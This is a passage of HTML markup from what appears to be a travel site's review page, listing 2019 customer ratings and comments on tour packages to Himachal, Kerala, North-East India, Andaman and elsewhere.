                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Nov 2019</small></h5>
                      <p style="margin:0px;">It was a great experience visiting North East through Trips-N-Trekks.. Thanks for wonderful memories. â˜º</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Bibek gouda  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Nov 2019</small></h5>
                      <p style="margin:0px;">Had a wonderful trip to gangtok.hotels and cabs are super. Thanks to trips-n-trekks for arranging such a amazing trip .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Aditya gautam  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Nov 2019</small></h5>
                      <p style="margin:0px;">It was nice & well managed tour setup. All things were as per itinerary, no any complaints regarding services. Thanks for wonderfull visit to Sikkim & Darjeeling. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Amar  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Nov 2019</small></h5>
                      <p style="margin:0px;">Very good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Akanksha  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Nov 2019</small></h5>
                      <p style="margin:0px;">The trip was good and the service was amazing. Abhimanyu was great in coordinating and the experience overall was excellent. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from chirag machhi  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Nov 2019</small></h5>
                      <p style="margin:0px;">It was a nice trip for us in budget..we enjoyed a lot.the diver was also good <br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Omkar Kadve for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Nov 2019</small></h5>
                      <p style="margin:0px;">We had great trip with andaman travel mart. The host was very helpful.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gyanendra Fulzalke  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2019</small></h5>
                      <p style="margin:0px;">We enjoyed Great holiday at Munnar Thkiddy Allepppy and Kochi. Company is very good but driver provided was very bad. Driver was worst.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nitin Zine  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2019</small></h5>
                      <p style="margin:0px;">It was a great and lovely service and experience with my trip my way<br />
    <br />
    A very good assistance by Ms. Hemlata Madam.<br />
    <br />
    Thanks to all<br />
    <br />
    Eagerly waiting for next trip with my trip my way..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from BABUDAS E  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2019</small></h5>
                      <p style="margin:0px;">I am from Kerala, we were in a trip to dehradoon and we thought of visiting Manali, we were so much confused, and we came to travelsetu, two - three agents contacted with quotes among which Meghna Gill from Holidays Icon really helped with suggestions and alterations according to our ideas. So we decided to choose their service and she proved we were right, although the driver was bit unprofessional some ways Meghna was there to solve any concerns, I really appreciate the commitment..<br />
    She arranged the whole trip in a very short time..I am not giving 5 star just because next time you should be more careful while choosing drivers!<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Yogeshwar  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2019</small></h5>
                      <p style="margin:0px;">My Trip My Way did a good job of planning, implementing and following up on your tour. My honeymoon package   is very memorable . It was a great time with them, Mr. Jagdish and Hitesh Sharma  was very much cooperative. Car was in good condition and the driver was really co-operative. All hotels were nice..Thank you so much My Trip Ny Way. Really they are very professional people ad give there1000 percent to make your holidays best.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Siva Kumar  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Nov 2019</small></h5>
                      <p style="margin:0px;">Mr Biraj was my coordinator. Had a wonderful experience. Everything went as per plan. Thank you travelsetu. Will join u for my future trips also. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ramesh polamarasetty  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Nov 2019</small></h5>
                      <p style="margin:0px;">Everything is good..Except the boat house is not in good condition ..Room is not clean ,even the blankets . Full of mosquitoes and service is just ok .. please choose the good boat houses .Mediator pramod seems like not in good terms with abhijit who is our driver ..Abhijit is good driver cum guide ..Suggested us good places to see ..Good navigator and driver .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Mahavir Raj parakh  for South-India trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Nov 2019</small></h5>
                      <p style="margin:0px;">Superb </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Parth  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Nov 2019</small></h5>
                      <p style="margin:0px;">This Trip Is my Life's best TripsÃ°ÂŸÂ˜Âƒ</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manish sharma  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Nov 2019</small></h5>
                      <p style="margin:0px;">Best management of whole trip...<br />
    Able to connect at any time to get help.. . It provide best  rooms and food...</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Niraja  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Nov 2019</small></h5>
                      <p style="margin:0px;">One Group Holidays is best travel agent I have seen ever in my last 20 years travel experience in India and Abroad. Their rate is very economic compare to service level. Last week I have been in Kerala with my family to enjoy Durga Puja Holiday....and my family also very pleased with their service. Wish One Group Holidays a great future ahead. I am assuring that in future my 1st preference for any family tour with One Group only. Cheers !!</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Niraja  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Nov 2019</small></h5>
                      <p style="margin:0px;">There was a great experience with this company....... With excellent service... Completely arrange super facilities for us.... Everyone go for ur trip with one group holidays</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Akshay bhavsar  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Nov 2019</small></h5>
                      <p style="margin:0px;">Nice time with travel setu. <br />
    Nice hotel and nice hotel staff .<br />
    My life best journey with travel setu.<br />
    Next time I will with travel setu.<br />
    Gegards <br />
    Akshay bhavsar</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jimi  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;12th, Nov 2019</small></h5>
                      <p style="margin:0px;">Nice trip through my trip my way... Mr. Jagdish is so helpful in entire trip... He is continuously in contact with me... All Hotels provided by them are very nice and in good location... View from balcony is awesome in shimla & Dalhousie hotels... Food was good... our driver Sukhvinder Singh is very professional.... So, Overall Very good, Excellent Tour of Himachal Pradesh with My Trip My Way... Thanks to Mr. Jagdish, Mr. Hitesh Sharma & Driver Sukhvinder... Thank u All.... I highly recommend my trip my way to book your tour of himachal... thanks...</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Vinod Kashyap for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Nov 2019</small></h5>
                      <p style="margin:0px;">How a wonderful trip made by tourist Triangle best hotel best travelling best food thank you travelling</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sanjiv   for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;9th, Nov 2019</small></h5>
                      <p style="margin:0px;">Very good arrangement from your team. specially from aditi saha. The entire trip was arranged by har with proper communication with us and also with car drivers. Hotels which are booked for us was also very good. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sunil Taparia  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Nov 2019</small></h5>
                      <p style="margin:0px;">We had excellent trip and very well organised and managed by Yes tourism<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jamal  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Nov 2019</small></h5>
                      <p style="margin:0px;">Awesome trip n Maxis Travel done good job everything was arranged as per commitment thank you Maxis<br />
    Cab Driver Mr. Shine's behavior, driving is so nice.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from s.p panigrahi  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;4th, Nov 2019</small></h5>
                      <p style="margin:0px;">It was pretty good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rahul  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;3rd, Nov 2019</small></h5>
                      <p style="margin:0px;">Our journey shimla and manali with p.p travel was awesome and p.p travel service was good there agent was friendly and there driver was also good they behave like a friend . And p.p travel was 100% trusted website. In sort full journey was awesome</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Suketu  for Thailand trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Nov 2019</small></h5>
                      <p style="margin:0px;">Had a perfect Trip with Setango Travel. Nice coordination and planning by team. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prashant  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Oct 2019</small></h5>
                      <p style="margin:0px;">Nice Trip Arrangements,Hotel Booking also Good,In Lachung Lunch/Dinner In Package but Only Rice and Dal(Veg.) this is not expecting so please mention if any no more options there.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Amit Shukla  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Oct 2019</small></h5>
                      <p style="margin:0px;">It was an excellent trip. Driver and travel agents were very cooperative. Hotel at Portblair was little below par. Rest all was good.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Himanshu arya  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Oct 2019</small></h5>
                      <p style="margin:0px;">Awesome trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from saswati debnath  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Oct 2019</small></h5>
                      <p style="margin:0px;">Very good service</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Seema   for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Oct 2019</small></h5>
                      <p style="margin:0px;">Trip was good .Mr Jithin T the driver was the awesome guy and make our trip more beautiful. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Atul Sharma  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Oct 2019</small></h5>
                      <p style="margin:0px;">Good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Baren Sahoo  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Oct 2019</small></h5>
                      <p style="margin:0px;">My trip my way is the best agent to go with.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rohit  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Oct 2019</small></h5>
                      <p style="margin:0px;">It was good.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sunil  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Oct 2019</small></h5>
                      <p style="margin:0px;">A valuable & adventurous trip...<br />
    Thanks Jagdish G for such a wonderful trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Krishnendu biswas  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Oct 2019</small></h5>
                      <p style="margin:0px;">Nice arrangements and best trip. My daughter r enjoying camp stay very much. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Dwaipayan Roy  for Andaman trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Oct 2019</small></h5>
                      <p style="margin:0px;">The trip was awesome and beautiful. The hotels, Ferry's, cars and the whole arrangements were unbelievable. We get every kind of help from the Tour Co-ordinator. Indeed Andaman Travel Mart is a renowned travelling company and I recommend everyone to book any trip to Andaman through Andaman Travel Mart. It gives economic but fantastic arrangements along with friendly behaviour by everyone which you can never forget..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nandini  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Oct 2019</small></h5>
                      <p style="margin:0px;">Hlo Hitesh ji / Jagdish ji <br />
    We r really very thankfull to you this journey was awesome nd memorable Ã°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠ<br />
    We r glad that we were a part of my trip my way<br />
    Hotel facilitie's nd service was really goodÃ°ÂŸÂ‘ÂÃ°ÂŸÂÂ»Ã°ÂŸÂ‘ÂÃ°ÂŸÂÂ»<br />
    Cab service was awesomeÃ°ÂŸÂ˜ÂŒÃ°ÂŸÂ˜ÂŒ<br />
    Special thanku to Andy He was very supportive nd a good guider also Ã°ÂŸÂ˜ÂŒÃ°ÂŸÂ˜ÂŒ<br />
    <br />
    Nd specially jagish ji bahut paresan kiya apko mene Ã°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠ<br />
    But Really appericiated ki aapne hamare issue's solve kiye nd itni achi service diÃ°ÂŸÂ‘ÂÃ°ÂŸÂÂ»Ã°ÂŸÂ‘ÂÃ°ÂŸÂÂ»Ã°ÂŸÂ‘ÂÃ°ÂŸÂÂ»Ã°ÂŸÂ‘ÂÃ°ÂŸÂÂ»Ã°ÂŸÂ‘ÂÃ°ÂŸÂÂ»<br />
    Very well done job Ã°ÂŸÂ˜ÂŠ<br />
    I m really very happy <br />
    If i will plane next time than i'll definetly contact you Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»Ã°ÂŸÂ¤Â˜Ã°ÂŸÂÂ»</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from KUNDAN SHARAN  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Oct 2019</small></h5>
                      <p style="margin:0px;">  **wonderful experience planning my trip with Travelsetu.com  they are providing  packages . Everything was planned perfectly to meet my needs and I faced absolutely no any issues with the hotel or travelling and exploring in and around the place. I would like to thank Mr. Somnath  & North-East trip to Yes Tourism India Team  trip Adviser who helped me with everything and was available to answer my questions and help me coordinate with the cab and hotel services at all times.<br />
    ****Thanks to all teams ****</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nida Athar  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Oct 2019</small></h5>
                      <p style="margin:0px;">Good service and a comfortable trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Darshna   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;11th, Oct 2019</small></h5>
                      <p style="margin:0px;">it was nice trip</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Nilesh  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;29th, Sep 2019</small></h5>
                      <p style="margin:0px;">I had booked my Kerala package for 5N/6D and it was very wonderful experience.All the required arrangements of Cab, Hotel, Breakfast was perfect and on time. Above all, driver that was provided for entire trip was very approachable, helpful, jovial and guided us correctly.<br />
    <br />
    It was truly an amazing experience with Travel Navigators.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shweta  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Sep 2019</small></h5>
                      <p style="margin:0px;">We booked our trip to gangtok with trips-n-trekks and travel for 5 days and I must say they made our whole trip so comfortable. Food, accommodation, travel everything was so good, they treated us like a family.<br />
    I highly recommend trips-n-trekks..Ã°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠÃ°ÂŸÂ˜ÂŠ</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shyam Kumar Mahto  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Sep 2019</small></h5>
                      <p style="margin:0px;">Travelsetu is good...they are care very properly me. I like so much</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sarojini  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Sep 2019</small></h5>
                      <p style="margin:0px;">Thank you for organising our trip. We were very much happy and also felt comfortable during the trip. I shall strongly recommend trips n trekks for my friends and families who wanna go north east. Keep up your reputation...<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Amol shelke  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Sep 2019</small></h5>
                      <p style="margin:0px;">Thanks Hitesh sir and Tram</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sagar  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
